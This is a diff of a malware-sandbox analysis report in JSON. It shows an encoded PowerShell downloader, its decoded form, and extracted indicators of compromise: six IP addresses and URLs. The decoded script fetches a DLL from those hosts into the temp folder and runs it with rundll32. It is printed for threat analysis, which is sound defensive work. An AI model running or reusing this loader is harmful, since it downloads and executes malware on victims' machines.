@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 121,
+    "score": 122,
     "sections": [
       {
         "auto_collapse": false,
@@ -100,7 +100,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwA7ACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQAgAD0AIAAoACIAaAB0AHQAcAA6AC8ALwAyADAAMwAuADkANgAuADEANwA3AC4AMQAyADEALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAuADEANwAuADEANAAyAC8AbABKAGsARABiAGQAcAAuAGQAYQB0AGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMAMQAuADIAMAA0AC4AMQAxADQALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwA4ADcALgAyADMANgAuADEANAA2AC4AMQA2ADIALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADUAMQAuADgAMAAuADUALgA1ADAALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADMAOQAuADEAOAAwAC4AMgAwADkALgAyADAANgAvAGwASgBrAEQAYgBkAHAALgBkAGEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAGkAbgAgACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQApACAAewB0AHIAeQAgAHsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEANQAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAA7AGkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAFcAaQB0AGgAZQByAHQAaQBwAC4AZABsAGwAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBzAHQAYQByAHQAIAByAHUAbgBkAGwAbAAzADIAIAAkAGUAbgB2ADoAVABFAE0AUABcAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAAsAEcATAA3ADAAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADsAfQB9AA==\"",
+        "body": "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -109,12 +109,49 @@
           "dynamic": {
             "process": {
               "command_line": [
-                "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwA7ACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQAgAD0AIAAoACIAaAB0AHQAcAA6AC8ALwAyADAAMwAuADkANgAuADEANwA3AC4AMQAyADEALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAuADEANwAuADEANAAyAC8AbABKAGsARABiAGQAcAAuAGQAYQB0AGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMAMQAuADIAMAA0AC4AMQAxADQALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwA4ADcALgAyADMANgAuADEANAA2AC4AMQA2ADIALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADUAMQAuADgAMAAuADUALgA1ADAALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADMAOQAuADEAOAAwAC4AMgAwADkALgAyADAANgAvAGwASgBrAEQAYgBkAHAALgBkAGEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAGkAbgAgACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQApACAAewB0AHIAeQAgAHsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEANQAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAA7AGkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAFcAaQB0AGgAZQByAHQAaQBwAC4AZABsAGwAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBzAHQAYQByAHQAIAByAHUAbgBkAGwAbAAzADIAIAAkAGUAbgB2ADoAVABFAE0AUABcAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAAsAEcATAA3ADAAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADsAfQB9AA==\""
+                "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}"
               ]
             }
           }
         },
         "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"139.180.209.206\"}, {\"ioc_type\": \"ip\", \"ioc\": \"151.80.5.50\"}, {\"ioc_type\": \"ip\", \"ioc\": \"185.231.204.114\"}, {\"ioc_type\": \"ip\", \"ioc\": \"195.20.17.142\"}, {\"ioc_type\": \"ip\", \"ioc\": \"203.96.177.121\"}, {\"ioc_type\": \"ip\", \"ioc\": \"87.236.146.162\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://203.96.177.121/ljkdbdp.dathttp://195.20.17.142/ljkdbdp.dathttp://185.231.204.114/ljkdbdp.dathttp://87.236.146.162/ljkdbdp.dathttp://151.80.5.50/ljkdbdp.dathttp://139.180.209.206/ljkdbdp.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ljkdbdp.dathttp:\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "139.180.209.206",
+                "151.80.5.50",
+                "185.231.204.114",
+                "195.20.17.142",
+                "203.96.177.121",
+                "87.236.146.162"
+              ],
+              "uri": [
+                "http://203.96.177.121/ljkdbdp.dathttp://195.20.17.142/ljkdbdp.dathttp://185.231.204.114/ljkdbdp.dathttp://87.236.146.162/ljkdbdp.dathttp://151.80.5.50/ljkdbdp.dathttp://139.180.209.206/ljkdbdp.dat"
+              ],
+              "uri_path": [
+                "/ljkdbdp.dathttp:"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
         "zeroize_on_tag_safe": false
       }
     ]
@@ -122,14 +159,19 @@
   "files": {
     "extracted": [
       {
-        "name": "cmd_0.bat",
-        "sha256": "1524ce75b91b0d10ff55748d8109787d3bc866600ae22be358a430b9ec8d0d13"
+        "name": "boxjs_cmds.ps1",
+        "sha256": "971cc0af22ed0c974f6b9298aed9d9b0499c25ee5390b211f3d288c61b8993a7"
       }
     ],
     "supplementary": []
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -162,7 +204,53 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwA7ACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQAgAD0AIAAoACIAaAB0AHQAcAA6AC8ALwAyADAAMwAuADkANgAuADEANwA3AC4AMQAyADEALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAuADEANwAuADEANAAyAC8AbABKAGsARABiAGQAcAAuAGQAYQB0AGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMAMQAuADIAMAA0AC4AMQAxADQALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwA4ADcALgAyADMANgAuADEANAA2AC4AMQA2ADIALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADUAMQAuADgAMAAuADUALgA1ADAALwBsAEoAawBEAGIAZABwAC4AZABhAHQAaAB0AHQAcAA6AC8ALwAxADMAOQAuADEAOAAwAC4AMgAwADkALgAyADAANgAvAGwASgBrAEQAYgBkAHAALgBkAGEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAGkAbgAgACQAUABvAGwAeQBwAGgAYQByAG0AYQBjAG8AbgBTAHQAZQByAHYAZQApACAAewB0AHIAeQAgAHsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJABkAG8AYwB1AG0AZQBuAHQAZQBkAFMAYQBiAGUAcgBpAG4AZwAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEANQAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAA7AGkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAFcAaQB0AGgAZQByAHQAaQBwAC4AZABsAGwAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBzAHQAYQByAHQAIAByAHUAbgBkAGwAbAAzADIAIAAkAGUAbgB2ADoAVABFAE0AUABcAFwAVwBpAHQAaABlAHIAdABpAHAALgBkAGwAbAAsAEcATAA3ADAAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADsAfQB9AA==\""
+          "value": "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "139.180.209.206"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "151.80.5.50"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "185.231.204.114"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "195.20.17.142"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "203.96.177.121"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "87.236.146.162"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://203.96.177.121/ljkdbdp.dathttp://195.20.17.142/ljkdbdp.dathttp://185.231.204.114/ljkdbdp.dathttp://87.236.146.162/ljkdbdp.dathttp://151.80.5.50/ljkdbdp.dathttp://139.180.209.206/ljkdbdp.dat"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/ljkdbdp.dathttp:"
         }
       ]
     },
